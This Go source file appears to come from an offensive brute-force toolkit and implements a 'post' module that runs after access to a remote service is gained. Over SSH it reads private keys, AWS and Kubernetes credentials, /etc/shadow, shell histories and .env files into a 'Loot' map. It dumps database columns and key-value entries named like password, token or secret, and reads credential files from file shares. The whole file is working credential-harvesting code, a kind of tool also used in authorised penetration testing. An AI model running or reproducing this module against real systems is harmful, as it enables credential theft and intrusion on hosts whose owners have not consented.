package action

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/chainreactors/neutron/protocols"
	"github.com/chainreactors/parsers"
	"github.com/chainreactors/proton/proton/file"
	"github.com/chainreactors/proton/template"
	"github.com/chainreactors/zombie/pkg"
	"gopkg.in/yaml.v3"
)

var credentialColumns = []string{
	"password", "passwd", "pwd", "pass",
	"secret", "token", "api_key", "apikey",
	"access_key", "private_key", "auth",
	"credential", "connection_string",
	"encryption_key", "client_secret",
}

var shellScanPaths = []string{
	"~/.ssh/config", "~/.ssh/authorized_keys",
	"~/.ssh/id_rsa", "~/.ssh/id_ecdsa", "~/.ssh/id_ed25519",
	"~/.aws/credentials", "~/.aws/config",
	"~/.docker/config.json", "~/.kube/config",
	"/etc/shadow", "/etc/passwd",
	"~/.bash_history", "~/.zsh_history",
	"~/.my.cnf", "~/.pgpass", "~/.netrc",
	"~/.git-credentials", "~/.vault-token",
}

var shellGatherCmds = []struct {
	Name string
	Cmd  string
}{
	{"whoami", "id 2>/dev/null"},
	{"hostname", "hostname 2>/dev/null"},
	{"uname", "uname -a 2>/dev/null"},
	{"netstat", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"},
	{"env", "env 2>/dev/null"},
}

type PostAction struct {
	scanner *file.Scanner
	dbLimit int
}

func NewPostAction(templatePaths []string, dbLimit int) (*PostAction, error) {
	if dbLimit <= 0 {
		dbLimit = 1000
	}
	execOpts := &protocols.ExecuterOptions{Options: &protocols.Options{}}
	var rules []file.Rule
	for _, p := range templatePaths {
		tmpls, err := loadTemplatesFromPath(p, execOpts)
		if err != nil {
			return nil, fmt.Errorf("load templates from %s: %w", p, err)
		}
		for _, tmpl := range tmpls {
			if len(tmpl.RequestsFile) > 0 {
				rules = append(rules, file.Rule{
					ID: tmpl.Id, Name: tmpl.Info.Name,
					Severity: tmpl.Info.Severity, Requests: tmpl.RequestsFile,
				})
			}
		}
	}
	if len(rules) == 0 {
		return nil, fmt.Errorf("no file rules in loaded templates")
	}
	return &PostAction{
		scanner: file.NewScanner(rules, execOpts),
		dbLimit: dbLimit,
	}, nil
}

func (a *PostAction) Name() string { return "post" }

func (a *PostAction) Run(session pkg.Session, task *pkg.Task) (*pkg.ActionResult, error) {
	if sh, ok := pkg.AsShell(session); ok {
		return a.postShell(sh, task)
	}
	if sq, ok := pkg.AsSQL(session); ok {
		return a.postSQL(sq, task)
	}
	if kv, ok := pkg.AsKV(session); ok {
		return a.postKV(kv, task)
	}
	if fs, ok := pkg.AsFile(session); ok {
		return a.postFile(fs, task)
	}
	return nil, nil
}

func (a *PostAction) postShell(sh pkg.ShellSession, task *pkg.Task) (*pkg.ActionResult, error) {
	result := &pkg.ActionResult{Loot: make(map[string][]byte)}

	for _, c := range shellGatherCmds {
		out, err := sh.Exec(c.Cmd)
		if err != nil || len(out) == 0 {
			continue
		}
		label := fmt.Sprintf("ssh:%s:%s:%s", task.IP, task.Port, c.Name)
		result.Loot[label] = out
		result.Extracteds = append(result.Extracteds, &parsers.Extracted{
			Name: c.Name, ExtractResult: []string{truncate(string(out), 500)},
		})
	}

	for _, path := range shellScanPaths {
		data, err := sh.Exec(fmt.Sprintf("cat '%s' 2>/dev/null | head -c 1048576", path))
		if err != nil || len(data) == 0 {
			continue
		}
		label := fmt.Sprintf("ssh:%s:%s:%s", task.IP, task.Port, path)
		result.Loot[label] = data
		a.scanData(data, label, result)
	}

	envFiles, err := sh.Exec("find /home /opt /srv -maxdepth 3 -name '.env*' -type f 2>/dev/null")
	if err == nil {
		for _, p := range strings.Split(string(envFiles), "\n") {
			p = strings.TrimSpace(p)
			if p == "" {
				continue
			}
			data, err := sh.Exec(fmt.Sprintf("cat '%s' 2>/dev/null | head -c 1048576", p))
			if err != nil || len(data) == 0 {
				continue
			}
			label := fmt.Sprintf("ssh:%s:%s:%s", task.IP, task.Port, p)
			result.Loot[label] = data
			a.scanData(data, label, result)
		}
	}

	return result, nil
}

func (a *PostAction) postSQL(sq pkg.SQLSession, task *pkg.Task) (*pkg.ActionResult, error) {
	result := &pkg.ActionResult{}

	dbs, err := sq.Databases()
	if err == nil && len(dbs) > 0 {
		result.Extracteds = append(result.Extracteds, &parsers.Extracted{
			Name: "databases", ExtractResult: dbs,
		})
	}

	userQueries := map[string]string{
		"mysql":      "SELECT user, host FROM mysql.user",
		"postgresql": "SELECT usename FROM pg_catalog.pg_user",
		"mssql":      "SELECT name FROM sys.server_principals WHERE type IN ('S','U')",
	}
	if q, ok := userQueries[sq.Service()]; ok {
		rows, err := sq.Query(q)
		if err == nil && len(rows) > 1 {
			var users []string
			for i, row := range rows {
				if i == 0 {
					continue
				}
				users = append(users, strings.Join(row, "@"))
			}
			result.Extracteds = append(result.Extracteds, &parsers.Extracted{
				Name: "users", ExtractResult: users,
			})
		}
	}

	columns, err := a.discoverCredentialColumns(sq)
	if err == nil {
		for _, col := range columns {
			q := fmt.Sprintf("SELECT `%s` FROM `%s`.`%s` LIMIT %d", col.column, col.schema, col.table, a.dbLimit)
			if sq.Service() == "postgresql" || sq.Service() == "mssql" {
				q = fmt.Sprintf(`SELECT "%s" FROM "%s"."%s" LIMIT %d`, col.column, col.schema, col.table, a.dbLimit)
			}
			rows, err := sq.Query(q)
			if err != nil {
				continue
			}
			for i, row := range rows {
				if i == 0 || len(row) == 0 || row[0] == "" {
					continue
				}
				label := fmt.Sprintf("db:%s:%s:%s.%s.%s", task.IP, task.Port, col.schema, col.table, col.column)
				a.scanData([]byte(row[0]), label, result)
			}
		}
	}

	return result, nil
}

type dbColumn struct {
	schema, table, column string
}

func (a *PostAction) discoverCredentialColumns(sq pkg.SQLSession) ([]dbColumn, error) {
	var conditions []string
	for _, pat := range credentialColumns {
		conditions = append(conditions, fmt.Sprintf("LOWER(COLUMN_NAME) LIKE '%%%s%%'", pat))
	}

	excludeSchemas := "'information_schema','mysql','performance_schema','sys','pg_catalog','pg_toast'"
	q := fmt.Sprintf(
		"SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE (%s) AND TABLE_SCHEMA NOT IN (%s)",
		strings.Join(conditions, " OR "), excludeSchemas,
	)

	rows, err := sq.Query(q)
	if err != nil {
		return nil, err
	}
	var cols []dbColumn
	for i, row := range rows {
		if i == 0 || len(row) < 3 {
			continue
		}
		cols = append(cols, dbColumn{schema: row[0], table: row[1], column: row[2]})
	}
	return cols, nil
}

func (a *PostAction) postKV(kv pkg.KVSession, task *pkg.Task) (*pkg.ActionResult, error) {
	result := &pkg.ActionResult{}

	allKeys, err := kv.Keys("*")
	if err == nil {
		result.Extracteds = append(result.Extracteds, &parsers.Extracted{
			Name: "key_count", ExtractResult: []string{fmt.Sprintf("%d", len(allKeys))},
		})
		if len(allKeys) > 0 && len(allKeys) <= 50 {
			result.Extracteds = append(result.Extracteds, &parsers.Extracted{
				Name: "keys", ExtractResult: allKeys,
			})
		}
	}

	patterns := []string{"*password*", "*secret*", "*token*", "*key*", "*cred*", "*auth*"}
	seen := make(map[string]bool)
	for _, pat := range patterns {
		keys, err := kv.Keys(pat)
		if err != nil {
			continue
		}
		for _, key := range keys {
			if seen[key] {
				continue
			}
			seen[key] = true
			val, err := kv.Get(key)
			if err != nil || len(val) == 0 {
				continue
			}
			label := fmt.Sprintf("kv:%s:%s:%s", task.IP, task.Port, key)
			a.scanData(val, label, result)
		}
	}

	return result, nil
}

func (a *PostAction) postFile(fs pkg.FileSession, task *pkg.Task) (*pkg.ActionResult, error) {
	result := &pkg.ActionResult{Loot: make(map[string][]byte)}

	entries, err := fs.List("/")
	if err != nil {
		return result, nil
	}
	if len(entries) > 0 {
		result.Extracteds = append(result.Extracteds, &parsers.Extracted{
			Name: "root_listing", ExtractResult: entries,
		})
	}

	sensitive := []string{".env", "config", "credential", ".htpasswd", ".pgpass", ".my.cnf", ".netrc"}
	for _, entry := range entries {
		name := strings.ToLower(entry)
		for _, s := range sensitive {
			if strings.Contains(name, s) {
				data, err := fs.Read("/" + entry)
				if err != nil || len(data) == 0 {
					continue
				}
				label := fmt.Sprintf("file:%s:%s:/%s", task.IP, task.Port, entry)
				result.Loot[label] = data
				a.scanData(data, label, result)
				break
			}
		}
	}

	return result, nil
}

func (a *PostAction) scanData(data []byte, label string, result *pkg.ActionResult) {
	if a.scanner == nil {
		return
	}
	for _, group := range a.scanner.Groups {
		findings := a.scanner.ScanData(data, label, group)
		for _, f := range findings {
			var extracts []string
			for _, e := range f.Extracts {
				extracts = append(extracts, e.Value)
			}
			for _, events := range f.Matches {
				for _, e := range events {
					extracts = append(extracts, e.Value)
				}
			}
			if len(extracts) > 0 {
				result.Extracteds = append(result.Extracteds, &parsers.Extracted{
					Name:          fmt.Sprintf("%s:%s", f.TemplateID, label),
					Severity:      f.Severity,
					ExtractResult: extracts,
				})
			}
		}
	}
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func loadTemplatesFromPath(path string, execOpts *protocols.ExecuterOptions) ([]*template.Template, error) {
	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if !info.IsDir() {
		return loadTemplateFile(path, execOpts)
	}
	var tmpls []*template.Template
	filepath.WalkDir(path, func(p string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if !strings.HasSuffix(p, ".yaml") && !strings.HasSuffix(p, ".yml") {
			return nil
		}
		loaded, err := loadTemplateFile(p, execOpts)
		if err != nil {
			return nil
		}
		tmpls = append(tmpls, loaded...)
		return nil
	})
	return tmpls, nil
}

func loadTemplateFile(path string, execOpts *protocols.ExecuterOptions) ([]*template.Template, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var tmpl template.Template
	if err := yaml.Unmarshal(data, &tmpl); err != nil {
		return nil, err
	}
	if len(tmpl.RequestsFile) == 0 {
		return nil, nil
	}
	if err := tmpl.Compile(execOpts); err != nil {
		return nil, err
	}
	return []*template.Template{&tmpl}, nil
}
